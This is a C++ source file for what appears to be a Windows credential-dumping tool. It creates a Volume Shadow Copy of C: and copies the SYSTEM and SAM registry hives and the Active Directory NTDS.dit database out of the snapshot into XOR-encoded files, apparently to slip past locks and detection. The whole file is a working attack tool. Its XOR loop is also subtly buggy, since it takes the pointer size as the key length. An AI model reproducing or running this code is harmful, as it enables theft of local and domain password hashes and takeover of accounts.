#pragma once 

#include "main.h"

void CopyShadowFiles(std::wstring inputFilePath, std::wstring outputFilePath, char xorKey[])
{
	//std::wstring inputFilePath = L"\\Windows\\system32\\config\\SYSTEM";
	//std::wstring outputFilePath = L"C:\\SYSTEM.xor";  // Replace with your output path


	// Open the input file using CreateFile
	HANDLE hFile = CreateFile(inputFilePath.c_str(),
		GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

	if (hFile == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Error opening input file: " << inputFilePath << L" " << GetLastError() << std::endl;
		return;
	}

	// Open the output file
	HANDLE hOutFile = CreateFile(outputFilePath.c_str(),
		GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hOutFile == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Error opening output file: " << outputFilePath << L" " << GetLastError() << std::endl;
		CloseHandle(hFile);
		return;
	}

	// Read and XOR bytes
	DWORD bytesRead, bytesWritten;
	char buffer[4096];  // Buffer for reading and writing

	while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, nullptr) && bytesRead > 0) {
		// XOR each byte with key
		for (DWORD i = 0; i < bytesRead; ++i) {

			buffer[i] ^= xorKey[i % sizeof(xorKey)];
		}

		// Write the XOR-ed data to the output file
		WriteFile(hOutFile, buffer, bytesRead, &bytesWritten, nullptr);
	}

	// Close the files
	CloseHandle(hFile);
	CloseHandle(hOutFile);

	std::wcout << L"File processed and saved to: " << outputFilePath << std::endl;
}



// https://github.com/albertony/vss/
int main(int argc, char** argv) {

	std::wcout << L"Initializing COM context" << std::endl;

	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

	CoInitializeSecurity(
		NULL,                           //  Allow *all* VSS writers to communicate back!
		-1,                             //  Default COM authentication service
		NULL,                           //  Default COM authorization service
		NULL,                           //  reserved parameter
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  //  Strongest COM authentication level
		RPC_C_IMP_LEVEL_IMPERSONATE,    //  Minimal impersonation abilities 
		NULL,                           //  Default COM authentication settings
		EOAC_DYNAMIC_CLOAKING,          //  Cloaking
		NULL                            //  Reserved parameter
	);


	std::wcout << L"Creating VssBackupComponent object" << std::endl;

	system("pause");

	IVssBackupComponentsPtr m_pVssObject;
	//SnapshotSetInfo         m_latestSnapshotSet;
	VSS_ID snapSetId;


	CreateVssBackupComponents(&m_pVssObject);
	m_pVssObject->InitializeForBackup();
	m_pVssObject->SetContext(VSS_CTX_FILE_SHARE_BACKUP);
	m_pVssObject->SetBackupState(true, true, VSS_BT_FULL, false);
	m_pVssObject->StartSnapshotSet(&snapSetId);

	//snapSetIdString = Guid2WString(snapSetId);


	std::wcout << L"Adding volumes to shadow set" << std::endl;


	// Add volumes to the shadow set 
	//for (size_t i = 0; i < volumeList.size(); ++i)
	//{
		//wstring volume = volumeList[i];
	wstring volume = GetUniqueVolumeNameForPath(L"c:");
	VSS_ID snapshotId;
	m_pVssObject->AddToSnapshotSet((LPWSTR)volume.c_str(), GUID_NULL, &snapshotId);
	wstring snapshotIdString = Guid2WString(snapshotId);
	//m_latestSnapshotSet.snapshots.push_back(SnapshotInfo{ snapshotId, snapshotIdString });
	//}

	std::wcout << L"Snapshot ID" << snapshotIdString << std::endl;



	std::wcout << L"Creating snapshot and wait a bit..." << std::endl;

	system("pause");

	IVssAsyncPtr pAsync;
	m_pVssObject->DoSnapshotSet(&pAsync);
	pAsync->Wait();
	HRESULT hrReturned = S_OK;
	pAsync->QueryStatus(&hrReturned, NULL);


	/*for (size_t i = 0; i < m_latestSnapshotSet.snapshots.size(); ++i)
	{*/
	// Get shadow copy device (if the snapshot is there)
	VSS_SNAPSHOT_PROP vssSnapProps;
	m_pVssObject->GetSnapshotProperties(snapshotId, &vssSnapProps);
	// Automatically call VssFreeSnapshotProperties on this structure at the end of scope
	CAutoSnapPointer snapAutoCleanup(&vssSnapProps);
	//m_latestSnapshotSet.snapshots[i].deviceName = vssSnapProps.m_pwszSnapshotDeviceObject;

	std::wstring shadowDevice(vssSnapProps.m_pwszSnapshotDeviceObject);
	std::wcout << shadowDevice << std::endl;
	//}


	std::wcout << L"Snapshot complete!" << std::endl;

	std::wcout << L"Copying shadow files..." << std::endl;

	system("pause");

	// *
	char key[] = { 0x00 }; 
	CopyShadowFiles(shadowDevice + L"\\Windows\\system32\\config\\SYSTEM", L"C:\\SYSTEM.xor", key);
	CopyShadowFiles(shadowDevice + L"\\Windows\\system32\\config\\SAM", L"C:\\SAM.xor", key);
	CopyShadowFiles(shadowDevice + L"\\Windows\\NTDS\\NTDS.dit", L"C:\\NTDS.xor", key);



	std::wcout << L"Done!" << std::endl;


	return 0;
}

